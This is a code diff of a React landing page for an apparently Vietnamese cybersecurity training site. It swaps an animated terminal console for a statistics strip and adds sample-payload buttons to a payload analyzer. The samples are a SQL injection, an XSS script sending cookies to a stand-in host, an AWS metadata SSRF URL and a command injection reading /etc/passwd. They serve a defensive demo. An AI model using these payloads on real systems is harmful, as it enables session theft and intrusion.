-                  <div className="text-xs font-medium text-slate-500 dark:text-slate-400 cyberpunk:text-cyan-300/80">Chuyên Viên Tác Chiến</div>
-                </div>
-                <div className="space-y-0.5">
-                  <div className="font-mono-tech text-2xl sm:text-3xl font-extrabold text-indigo-600 dark:text-indigo-400 cyberpunk:text-cyan-400">
-                    <CountUp end={120} suffix="+" />
-                  </div>
-                  <div className="text-xs font-medium text-slate-500 dark:text-slate-400 cyberpunk:text-cyan-300/80">Phòng Lab Thực Địa</div>
-                </div>
-                <div className="space-y-0.5">
-                  <div className="font-mono-tech text-2xl sm:text-3xl font-extrabold text-emerald-600 dark:text-emerald-400 cyberpunk:text-cyan-400">
-                    <CountUp end={100} suffix="%" />
-                  </div>
-                  <div className="text-xs font-medium text-slate-500 dark:text-slate-400 cyberpunk:text-cyan-300/80">MITRE ATT&CK</div>
-                </div>
               </div>
             </div>
 
-            {/* Right Column: Interactive Live Security Console */}
-            <div className="lg:col-span-6 flex justify-center">
-              {/* Console Chassis */}
-              <div className="w-full max-w-xl cyber-terminal rounded-2xl p-4 sm:p-5 text-slate-100 shadow-2xl relative">
-                {/* Window Frame Bar */}
-                <div className="flex items-center justify-between pb-3.5 border-b border-slate-800 cyberpunk:border-cyan-500/30 gap-2">
-                  <div className="flex items-center gap-1.5 sm:gap-2 shrink-0">
-                    <span className="h-2.5 w-2.5 sm:h-3 sm:w-3 rounded-full bg-rose-500/90 inline-block" />
-                    <span className="h-2.5 w-2.5 sm:h-3 sm:w-3 rounded-full bg-amber-500/90 inline-block" />
-                    <span className="h-2.5 w-2.5 sm:h-3 sm:w-3 rounded-full bg-emerald-500/90 inline-block" />
-                    <span className="hidden sm:inline ml-1.5 font-mono-tech text-xs text-slate-400 font-medium">
-                      analyst@range:~$
-                    </span>
-                    <span className="sm:hidden ml-1 font-mono-tech text-[11px] text-slate-400 font-medium">
-                      range:~$
-                    </span>
-                  </div>
-
-                  {/* Clean Tab Selector + Replay Button */}
-                  <div className="flex items-center gap-1.5 sm:gap-2 shrink-0">
-                    <div className="flex items-center bg-slate-900 cyberpunk:bg-[#060e1f] p-0.5 rounded-lg border border-slate-800 cyberpunk:border-cyan-500/30">
-                      {[
-                        { key: "cli", label: "CLI" },
-                        { key: "vector", label: "Vector" },
-                        { key: "defense", label: "Defense" },
-                      ].map((tab) => (
-                        <button
-                          key={tab.key}
-                          type="button"
-                          onClick={() => handleTabChange(tab.key)}
-                          className={`px-2 sm:px-3 py-0.5 sm:py-1 rounded text-[11px] sm:text-xs font-mono-tech transition-all cursor-pointer ${
-                            activeConsoleTab === tab.key
-                              ? "bg-indigo-600 dark:bg-indigo-600 cyberpunk:bg-blue-600 cyberpunk:text-white text-white font-bold shadow-2xs"
-                              : "text-slate-400 hover:text-slate-200 cyberpunk:text-cyan-300"
-                          }`}
-                        >
-                          {tab.label}
-                        </button>
-                      ))}
-                    </div>
-
-                    <button
-                      type="button"
-                      onClick={() => {
-                        setReplayKey((k) => k + 1)
-                        setActiveScenarioIdx(0)
-                        setCycleCount(0)
-                      }}
-                      className="p-1 sm:p-1.5 rounded text-slate-400 hover:text-white hover:bg-slate-800 transition-colors cursor-pointer shrink-0"
-                      title="Phát lại chuỗi thao tác"
-                      aria-label="Replay terminal animation"
-                    >
-                      <RotateCw className="h-3.5 w-3.5" />
-                    </button>
-                  </div>
+            {/* Telemetry Counter Strip Under Console */}
+            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 pt-8">
+              <div className="p-4 rounded-2xl bg-white/70 dark:bg-[#0e121a]/80 cyberpunk:bg-[#071329] border border-slate-200/80 dark:border-white/[0.08] cyberpunk:border-cyan-500/30 text-center shadow-xs">
+                <div className="font-mono-tech text-2xl sm:text-3xl font-extrabold text-slate-900 dark:text-white">
+                  <CountUp end={2400} suffix="+" />
                 </div>
-
-                {/* Console Output Screen with Real-Time Typing Animation & Infinite Loop */}
-                <TerminalTypingScreen
-                  key={`${activeConsoleTab}-${replayKey}-${cycleCount}`}
-                  scenarios={CONSOLE_SCENARIOS[activeConsoleTab] || CONSOLE_SCENARIOS.cli}
-                  scenarioIndex={activeScenarioIdx}
-                  onNextScenario={handleNextScenario}
-                />
-
-                {/* Console Footer with Live Drill Status */}
-                <div className="mt-4 pt-3 border-t border-slate-800 flex items-center justify-between text-xs text-slate-400 gap-2">
-                  <div className="flex items-center gap-2 min-w-0">
-                    <span className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse shrink-0" />
-                    <span className="font-mono-tech text-slate-300 font-semibold text-[11px] sm:text-xs truncate">
-                      {CONSOLE_SCENARIOS[activeConsoleTab]?.[activeScenarioIdx]?.title || "Active Container"}
-                    </span>
-                  </div>
-                  <Link
-                    to="/labs"
-                    className="text-blue-400 hover:text-cyan-300 font-mono-tech font-semibold flex items-center gap-1 transition-colors shrink-0 text-[11px] sm:text-xs whitespace-nowrap"
-                  >
-                    <span>Vào Phòng Lab</span>
-                    <ChevronRight className="h-3.5 w-3.5" />
-                  </Link>
+                <div className="text-xs font-medium text-slate-500 dark:text-slate-400 mt-1">Chuyên Viên Tác Chiến</div>
+              </div>
+              <div className="p-4 rounded-2xl bg-white/70 dark:bg-[#0e121a]/80 cyberpunk:bg-[#071329] border border-slate-200/80 dark:border-white/[0.08] cyberpunk:border-cyan-500/30 text-center shadow-xs">
+                <div className="font-mono-tech text-2xl sm:text-3xl font-extrabold text-indigo-600 dark:text-indigo-400">
+                  <CountUp end={120} suffix="+" />
                 </div>
+                <div className="text-xs font-medium text-slate-500 dark:text-slate-400 mt-1">Phòng Lab Thực Địa</div>
+              </div>
+              <div className="p-4 rounded-2xl bg-white/70 dark:bg-[#0e121a]/80 cyberpunk:bg-[#071329] border border-slate-200/80 dark:border-white/[0.08] cyberpunk:border-cyan-500/30 text-center shadow-xs">
+                <div className="font-mono-tech text-2xl sm:text-3xl font-extrabold text-emerald-600 dark:text-emerald-400">
+                  <CountUp end={100} suffix="%" />
+                </div>
+                <div className="text-xs font-medium text-slate-500 dark:text-slate-400 mt-1">Chuẩn MITRE ATT&CK</div>
+              </div>
+              <div className="p-4 rounded-2xl bg-white/70 dark:bg-[#0e121a]/80 cyberpunk:bg-[#071329] border border-slate-200/80 dark:border-white/[0.08] cyberpunk:border-cyan-500/30 text-center shadow-xs">
+                <div className="font-mono-tech text-2xl sm:text-3xl font-extrabold text-cyan-600 dark:text-cyan-400">
+                  <CountUp end={0} suffix="%" />
+                </div>
+                <div className="text-xs font-medium text-slate-500 dark:text-slate-400 mt-1">Egress Data Leakage</div>
               </div>
             </div>
           </div>
@@ -1447,6 +1618,30 @@ export function LandingPage() {
                   )}
                   <span>{isScanning ? "Đang Quét..." : "Phân Tích Payload"}</span>
                 </button>
+              </div>
+
+              {/* Quick Attack Sample Chips */}
+              <div className="flex flex-wrap items-center gap-1.5 pt-0.5">
+                <span className="text-[11px] font-mono-tech text-slate-500 dark:text-slate-400 font-semibold uppercase">
+                  Mẫu payload:
+                </span>
+                {[
+                  { label: "SQL Tautology", val: "' OR 1=1 --" },
+                  { label: "Polyglot XSS", val: "<script>fetch('http://c2.io?c='+document.cookie)</script>" },
+                  { label: "AWS IMDS SSRF", val: "http://169.254.169.254/latest/meta-data/" },
+                  { label: "Command Injection", val: "; cat /etc/passwd #" },
+                ].map((p) => (
+                  <button
+                    key={p.val}
+                    type="button"
+                    onClick={() => {
+                      setTestPayload(p.val)
+                    }}
+                    className="text-[10px] font-mono-tech px-2 py-0.5 rounded bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-700 transition-colors cursor-pointer"
+                  >
+                    {p.label}
+                  </button>
+                ))}
               </div>
 
               {scanResult && (
